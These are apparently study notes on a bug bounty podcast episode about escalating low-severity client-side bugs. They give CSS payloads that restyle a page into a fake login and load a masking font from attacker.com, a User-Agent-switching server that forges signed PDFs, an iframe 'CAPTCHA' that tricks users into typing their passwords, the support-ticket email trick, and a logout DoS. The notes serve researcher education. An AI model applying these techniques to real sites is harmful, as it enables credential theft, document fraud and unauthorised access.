# EP33: Inti De Ceukelaire - Creative Bug Escalation & The Ticket Trick - Client-Side Security Notes

## Metadata
- **Guests:** Inti De Ceukelaire (Intigriti), Justin Gardner (@rhynorater), Joel Margolis (teknogeek)
- **Date:** 2024 (pre-October, references upcoming Intel LHE in Lisbon)
- **Podcast:** Critical Thinking Bug Bounty Podcast - Episode 33
- **Focus:** CSS injection exploitation, iframe-based password exfiltration, ticket trick (email-based account access), creative impact escalation of low-severity client-side bugs

---

> **Client-Side Content Level: MODERATE-HIGH.** This episode contains several detailed client-side exploitation techniques: stored CSS injection escalated to credential theft, iframe clickjacking/CAPTCHA phishing for password exfiltration, and CSS-based document forgery. The bugs discussed are all creative escalations of what would normally be considered low-severity client-side issues.

---

## Technique 1: Stored CSS Injection Escalated to Plaintext Password Theft

A stored CSS injection on a collaboration platform's homepage was escalated from "cosmetic" to "credential theft" by re-styling the entire page to look like the login screen and capturing passwords via a chat/comment field.

### How It Works

1. **Find the CSS injection point:** On a collaboration platform, sending an invite to another user causes attacker-controlled content to render on the victim's homepage. XSS is filtered, but CSS injection is possible (style attributes or similar).

2. **Overlay the entire page:** Use CSS `position: absolute`, `z-index`, and `background: white` to create a full-page overlay that hides the real content:

```css
/* Attacker-injected CSS -- conceptual reconstruction */

/* Step 1: Hide all real page content under a white overlay */
.page-wrapper {
    position: relative;
}
/* Use an existing div, reposition it to cover everything */
.invite-container {
    position: absolute !important;
    top: 0 !important;
    left: 0 !important;
    width: 100vw !important;
    height: 100vh !important;
    background: white !important;
    z-index: 9999 !important;
}
```

3. **Rearrange existing page elements to mimic the login page:** Since CSS injection cannot add new DOM elements, the attacker repositions existing elements (input fields, buttons, text) to visually replicate the login form:

```css
/* Step 2: Move existing elements into login-form positions */
.username-display {
    /* Reposition to look like "Email:" label */
    position: absolute !important;
    top: 200px !important;
    left: 50% !important;
    transform: translateX(-50%) !important;
}

.chat-input-field {
    /* This is the key -- reposition the chat/comment input
       to look like the password field */
    position: absolute !important;
    top: 260px !important;
    left: 50% !important;
    transform: translateX(-50%) !important;
    width: 300px !important;
}

.submit-button {
    /* Reposition submit/send button to look like "Login" */
    position: absolute !important;
    top: 310px !important;
    left: 50% !important;
    transform: translateX(-50%) !important;
}
```

4. **Create a custom "dots" font to mask the password field:** The chat input is a normal text field. To make it look like a password field (showing dots instead of characters), the attacker creates a custom font where every glyph is a filled circle/dot, then loads it via the CSS injection:

```css
/* Step 3: Load a custom font that renders all characters as dots */
@font-face {
    font-family: 'PasswordDots';
    /* Attacker-hosted font file where every character
       renders as a bullet/dot character */
    src: url('https://attacker.com/dots-font.woff2') format('woff2');
}

.chat-input-field {
    font-family: 'PasswordDots' !important;
    /* Now any text typed here appears as ●●●●●●●● */
    /* Victim thinks this is a password field */
}
```

5. **Victim visits their homepage, sees "login page", types password, hits "Login":** The submit action actually sends a chat message containing their plaintext password directly to the attacker.

```
Full attack flow:

Attacker                          Victim's Browser                    Victim
   |                                    |                                |
   |-- Send invite with CSS payload --> |                                |
   |                                    |-- Stored on victim homepage    |
   |                                    |                                |
   |                                    | <-- Victim visits homepage --- |
   |                                    |                                |
   |                                    |-- CSS injection fires          |
   |                                    |-- Page restyled to login form  |
   |                                    |-- Chat input = password field  |
   |                                    |-- Custom font shows dots       |
   |                                    |                                |
   |                                    | <-- Victim types password ---  |
   |                                    | <-- Victim clicks "Login" ---  |
   |                                    |                                |
   | <--- Chat message with password -- |                                |
   |      (plaintext!)                  |                                |
```

### Why This Works

- CSS injection is often dismissed as "cosmetic" or "informational" -- most programs and even some platforms classify it as low/out-of-scope by default.
- CSS is powerful enough to completely rearrange a page's visual presentation without touching the DOM structure. You cannot add elements, but you can reposition, hide, and restyle every existing element.
- The `@font-face` trick with a custom dots font is the critical piece: it makes a regular text input field indistinguishable from a password field to the user.
- Because the injection is **stored** and appears on the victim's **homepage** (an authenticated page they visit routinely), the phishing context is extremely convincing -- the victim sees what appears to be a session timeout requiring re-login.
- The password is transmitted through the application's own legitimate functionality (chat/comment), so there are no cross-origin restrictions or CSP issues to bypass.

### Where To Apply This

- Any stored CSS injection on an authenticated page, especially:
  - Dashboards or homepages where users land after login
  - Collaboration platforms with invite/notification rendering
  - Any page with both a CSS injection and a user-input field (comment, chat, search) whose submission the attacker can read
- Look for `style` attribute injection, `class` attribute injection that maps to attacker-defined classes, or CSS-in-URL parameters that get reflected into stylesheets
- The custom font technique works in any CSS injection context -- if you can load `@font-face`, you can mask text input

---

## Technique 2: CSS Injection for Document Signature Forgery via User-Agent Sniffing

A CSS injection in a document-signing service was exploited to show one document to the human viewer but a completely different document in the legally-binding signed PDF.

### How It Works

1. **Find CSS injection in a document-signing platform:** The injection exists both in the browser preview and in the server-side PDF generation pipeline.

2. **Inject an externally-hosted image overlay:** Use CSS to place an `<img>` (via `background-image` or existing `<img>` element styling) that covers the entire document content:

```css
/* Injected CSS in the document */
.document-body {
    background-image: url('https://attacker.com/overlay.png') !important;
    background-size: cover !important;
    background-repeat: no-repeat !important;
}
/* Or reposition an existing image element to cover everything */
```

3. **Server-side User-Agent detection:** The attacker's server inspects the `User-Agent` header on every request for the overlay image:

```python
# Attacker's server logic (conceptual)
@app.route('/overlay.png')
def serve_overlay():
    user_agent = request.headers.get('User-Agent', '')

    if 'wkhtmltopdf' in user_agent or 'PDF' in user_agent or 'HeadlessChrome' in user_agent:
        # PDF renderer is fetching -- serve the FORGED contract
        return send_file('forged_contract_overlay.png')
    else:
        # Human browser is fetching -- serve the LEGITIMATE-looking contract
        return send_file('legitimate_contract_overlay.png')
```

4. **Victim reviews document in browser:** They see the legitimate-looking contract overlay. They sign it. The PDF renderer then fetches the same image URL but with a different User-Agent, receiving the forged contract. The signed PDF now contains the attacker's forged content with the victim's real signature.

```
Attack flow:

Attacker uploads document with CSS injection
                |
                v
    +---------------------------+
    | Document Signing Platform |
    +---------------------------+
           |              |
    [Browser Preview]  [PDF Generator]
           |              |
           v              v
    GET /overlay.png  GET /overlay.png
    UA: Chrome/...    UA: wkhtmltopdf/...
           |              |
           v              v
    +-------------+  +------------------+
    | Real        |  | FORGED           |
    | Contract    |  | Contract         |
    | (looks ok)  |  | (different terms)|
    +-------------+  +------------------+
           |              |
    Victim signs    Legally-binding PDF
    thinking it's   contains forged content
    legitimate      with real signature
```

### Why This Works

- Document signing platforms often render CSS both in the browser preview and in the PDF generation backend.
- The PDF generation library (wkhtmltopdf, Puppeteer, etc.) uses a different User-Agent string than the user's browser. This allows the attacker's server to serve different content to each.
- The externally-hosted image technique means the attacker controls what is displayed at render time -- they can change it between the preview and the PDF generation steps.
- The signed PDF is the legally binding document, and it now contains the attacker's forged content.

### Where To Apply This

- Any document signing or contract platform that allows CSS injection or image URL injection
- PDF generation services that fetch external resources
- Any context where server-side rendering and client-side rendering use different User-Agents to fetch the same resource
- Check for this pattern: if a platform renders user-controlled CSS both in browser and in a backend PDF/image pipeline

---

## Technique 3: iframe + CAPTCHA Phishing for Password Exfiltration (The "Gotcha" Bug)

A password manager that displayed plaintext passwords in an API endpoint without `X-Frame-Options` was exploited by iframing the password display and disguising it as a CAPTCHA that the victim would solve by typing their own password back to the attacker.

### How It Works

1. **Discover plaintext password display:** A password manager exposes saved credentials via an API endpoint or page that renders the plaintext password in the DOM. This is legitimate for a password manager's functionality.

2. **Check for framing protections:** The endpoint lacks `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` headers, allowing it to be embedded in an iframe on an attacker-controlled page:

```html
<!-- Attacker's page: https://attacker.com/captcha.html -->

<!-- Hidden iframe loading victim's password from the password manager -->
<!-- The iframe shows the victim's own Facebook password in plaintext -->
<iframe
    id="pw-frame"
    src="https://passwordmanager.com/api/vault/entry/facebook"
    style="
        position: absolute;
        /* Carefully positioned to appear inside the CAPTCHA box */
        top: 142px;
        left: 87px;
        width: 280px;
        height: 40px;
        border: none;
        overflow: hidden;
        /* CSS filters to make the text look like a CAPTCHA */
        filter: contrast(0.8) blur(0.3px);
        opacity: 0.85;
    "
></iframe>
```

3. **Apply CSS filters to make the password text look like a CAPTCHA:** Use CSS transforms and filters to distort the displayed password so it resembles CAPTCHA text:

```css
/* Applied to the iframe or its container */
.captcha-display {
    /* Make text look distorted like a CAPTCHA */
    filter:
        contrast(1.2)
        blur(0.4px)
        hue-rotate(15deg);

    /* Skew and rotate slightly for CAPTCHA effect */
    transform: skewX(-5deg) rotate(-2deg);

    /* Noisy background */
    background-image: url('captcha-noise-overlay.png');
    background-blend-mode: multiply;
}
```

4. **Individual letter isolation and scrambling:** Inti described isolating individual characters from the password, randomizing their positions (creating an anagram), and applying per-character distortion so the victim wouldn't recognize it as their password:

```
Original password: "MyP@ss123"

After attacker processing:
+------------------------------------------+
|                                          |
|    3   @   P   1   M   s   2   y   s    |
|   (each letter tilted, distorted,        |
|    positioned randomly in a grid)        |
|                                          |
+------------------------------------------+
          "Type the characters above"
          [____________________________]
          [    Submit CAPTCHA    ]
```

5. **Victim solves the "CAPTCHA":** The victim types the characters they see (which are actually their own password scrambled) into the attacker's input field. The attacker receives all the characters and since they know the original order (from the iframe), they reconstruct the password.

```
Full attack flow:

Attacker Page                  Password Manager             Victim
     |                              |                          |
     |                              |                          |
     |--- iframe src=pw endpoint -->|                          |
     |                              |--- Returns password ---> |
     |                              |    (in iframe)           |
     |                              |                          |
     |--- CSS distorts password     |                          |
     |    to look like CAPTCHA      |                          |
     |                              |                          |
     |                              |           Victim sees    |
     |                              |           "CAPTCHA" with |
     |                              |           scrambled chars |
     |                              |                          |
     |<------ Victim types chars back into attacker's form --- |
     |                                                         |
     | Attacker now has all password                           |
     | characters and knows original                           |
     | order from iframe source                                |
```

6. **Multi-round extraction for long passwords:** If the password is longer than a typical CAPTCHA, fail the first attempt and show a "new" CAPTCHA with the remaining characters:

```
Round 1: Show first 8 chars scrambled -> "Try again"
Round 2: Show next 8 chars scrambled -> "Verified!"
Attacker now has full 16-char password
```

### Why This Works

- Password managers legitimately need to display plaintext passwords, creating a unique scenario where sensitive data is in the DOM.
- Missing `X-Frame-Options` / `frame-ancestors` headers allow the page to be embedded in an attacker's iframe.
- CSS filters (`blur`, `contrast`, `hue-rotate`) combined with transforms (`skew`, `rotate`) can make any text look like a CAPTCHA.
- Users are conditioned to type back distorted text they see in CAPTCHAs -- it is a well-understood interaction pattern that doesn't raise suspicion.
- Scrambling the character order prevents the victim from recognizing their own password.

### Where To Apply This

- Any application that displays sensitive data (passwords, tokens, API keys, PII) in the DOM on a page that can be iframed
- Check for missing `X-Frame-Options` and `Content-Security-Policy: frame-ancestors` headers on sensitive endpoints
- **Modern limitation:** SameSite cookie defaults (Lax) in modern browsers will prevent cookies from being sent in cross-origin iframes unless `SameSite=None` is explicitly set. Check the cookie attributes -- if `SameSite=None; Secure` is set, this attack still works.
- Look for password managers, credential vaults, or admin panels that display secrets and lack framing protections

---

## Technique 4: The Ticket Trick -- Email-Based Workspace Infiltration

By creating a support ticket on a platform, the attacker receives a reply-to email address on the target's domain (e.g., `support+token@company.com`). This valid `@company.com` email address is then used to register for internal services (like Slack) that whitelist the company's email domain.

### How It Works

1. **Identify a support ticket system that assigns @company.com email addresses:** Many companies use Zendesk, Jira Service Management, Freshdesk, etc. When you submit a ticket, you can reply via email to an address like `support+abc123@company.com`. This effectively gives you a valid `@company.com` email address that routes replies into the ticket.

2. **Create a support ticket:** Submit any question to the company's support portal. You now have a valid email address on their domain.

3. **Find services that use email domain whitelisting for signup:** Many companies configure Slack, Google Workspace, Notion, Asana, etc. to allow anyone with `@company.com` to self-register.

```
Attack flow:

Attacker                  Target's Support System        Target's Slack
   |                              |                           |
   |-- Submit support ticket ---> |                           |
   |                              |                           |
   |<-- Reply-to address:         |                           |
   |    support+abc123@target.com |                           |
   |                              |                           |
   |-- Use that email to --------|-------------------------> |
   |   register for Slack         |                           |
   |                              |                           |
   |                              |<-- Slack sends verify --- |
   |                              |    email to               |
   |                              |    support+abc123         |
   |                              |    @target.com            |
   |                              |                           |
   |<-- Verification email        |                           |
   |    appears as new ticket     |                           |
   |    reply (attacker can       |                           |
   |    read it!)                 |                           |
   |                              |                           |
   |-- Click verification link ---|-------------------------> |
   |                              |                           |
   |   ATTACKER NOW HAS ACCESS    |                           |
   |   TO TARGET'S INTERNAL SLACK |                           |
```

4. **Access internal communications:** Once registered on Slack (or similar), the attacker has access to all public channels, shared files, and potentially sensitive internal data.

### Why This Works

- Support ticket systems create valid email addresses on the company's domain as a side effect of their functionality.
- Companies often use email domain whitelisting as their only access control for internal tools -- "if you have an @company.com email, you must be an employee."
- The ticket system acts as a mail relay: any email sent to the ticket's reply address ends up visible to the ticket creator (the attacker).
- This bridges two security domains: the external-facing support system and the internal-only collaboration tools.

### Where To Apply This

- Any company with a support portal that assigns `@company.com` reply addresses
- Check their Slack/Teams signup pages -- do they allow self-registration via company email domain?
- Also check: Notion, Asana, Trello, Confluence, JIRA, Google Workspace -- many allow domain-based auto-join
- **Slack mitigation:** Slack now sends verification emails from `noreply-<random_token>@slack.com` instead of `noreply@slack.com`, making it harder to capture the verification email in some ticket systems. However, other services may not have implemented similar mitigations.
- Also try: registering on the company's own support portal (Zendesk, Freshdesk, etc.) with a victim's email address. If email verification is not enforced, you can view their past support tickets.

---

## Technique 5: CSS Injection -- Logout DoS via Background Image

Justin describes a related CSS injection where the only injectable CSS property was `background-image`. He set it to the application's logout URL.

### How It Works

```css
/* Injected via stored CSS injection (e.g., in an invite) */
.invite-card {
    /* Every time this element renders, the browser
       fetches the logout URL as if loading an image */
    background-image: url('https://target.com/api/logout') !important;
}
```

```
Attack flow:

Victim logs in
       |
       v
Homepage loads with attacker's stored invite
       |
       v
CSS renders, browser fetches background-image URL
       |
       v
GET https://target.com/api/logout  (with victim's cookies)
       |
       v
Victim is logged out immediately
       |
       v
Victim logs in again --> same thing happens --> infinite loop
```

### Why This Works

- Browsers fetch `background-image` URLs automatically when the CSS is rendered -- no user interaction required.
- If the logout endpoint accepts GET requests (common), the browser's image fetch triggers a real logout.
- Because the injection is stored, it fires every time the victim visits the page, creating a persistent denial-of-service.
- The logout request carries the victim's cookies because it is a same-origin request initiated by the page's own CSS.

### Where To Apply This

- Any CSS injection where you can control `background-image`, `list-style-image`, `cursor: url()`, `@font-face src`, or similar URL-fetching CSS properties
- Check if sensitive state-changing endpoints (logout, delete, toggle) accept GET requests
- Even if the endpoint returns non-image content, the browser still makes the request -- the "image load failure" is irrelevant because the side effect (logout) already happened

---

## Summary Table

| # | Technique | Type | Impact | Complexity |
|---|-----------|------|--------|------------|
| 1 | Stored CSS Injection to Password Theft (custom font + page restyle) | CSS Injection, Credential Theft | Critical -- plaintext passwords stolen | High -- requires custom font creation, precise CSS positioning, and a chat/comment submission vector |
| 2 | CSS Injection Document Forgery via User-Agent Sniffing | CSS Injection, Document Forgery | Critical -- forged legally-binding signed documents | Medium -- requires external image hosting and UA-based switching |
| 3 | iframe + CAPTCHA Phishing for Password Exfiltration ("Gotcha") | Clickjacking, Missing Framing Protections | Critical -- plaintext passwords exfiltrated | High -- requires missing X-Frame-Options, SameSite=None cookies, CSS distortion, and character scrambling |
| 4 | The Ticket Trick (email domain hijack via support system) | Logic Flaw, Access Control Bypass | High -- access to internal Slack/tools, email interception | Low -- straightforward email relay abuse |
| 5 | CSS Injection Logout DoS via background-image | CSS Injection, Denial of Service | Medium -- persistent account lockout | Low -- single CSS property injection |

---

## Key Quotes

> **Inti De Ceukelaire:** "It's not about the bug per se, because a lot of people will say, oh, its CSS injection must be low, its cross-site scripting must be medium. That doesn't always count. I mean, you will have programs that are more receptive to the actual impact."

> **Inti De Ceukelaire:** "I just want to max this out. So I wrote this like nine page report..."

> **Inti De Ceukelaire:** "What can I -- this is a behavior. And a behavior plus a good story can be a vulnerability."

> **Joel Margolis (teknogeek):** "If you stick around and you really persist and you take a little bit of extra time and effort and you figure out what is that threat model, how do I apply this to the threat model in a meaningful way, you can really escalate the impact of those bugs to take something that would typically probably not even be worth a bounty... and turn it into something that is super critical."

> **Justin Gardner:** "CSS is a lot more powerful than I thought it was... one of my highest paid bounties at this point, well into the five figure range, was a CSS injection bug."

> **Inti De Ceukelaire:** "Nobody literally nobody would ever just be like, oh, let me solve this captcha and be like, oh, that's my password."

> **Inti De Ceukelaire on the Ticket Trick origin:** "I saw this feature of GitLab that you could send something to them at a GitLab.com email address to create a ticket. So I was just messing around with that."

---

## Resources & References

- **The Ticket Trick:** Inti's original disclosure (search "ticket trick inti de ceukelaire" -- public HackerOne report on GitLab)
- **Intigriti XSS Challenges:** https://challenge.intigriti.io/ -- monthly XSS challenges for skill building
- **HackLuke's Bug Bounty Standards:** GitHub repo proposing standards for duplicate/systemic bug handling
- **LiveOverflow -- MissingNo Pokemon Bug:** Video on the buffer overflow behind the Pokemon glitch referenced by Inti
- **Inti's Twitter:** @securinti (bug bounty content)
- **VISS (Vulnerability Impact Scoring System):** Alternative to CVSS, used by Zoom's bug bounty program
- **OWASP Risk Rating Methodology:** Used by United Airlines' bug bounty program
- **SameSite Cookie Defaults:** Modern browsers default to `SameSite=Lax`, which blocks cross-site iframe cookie sending -- relevant to Technique 3's modern applicability
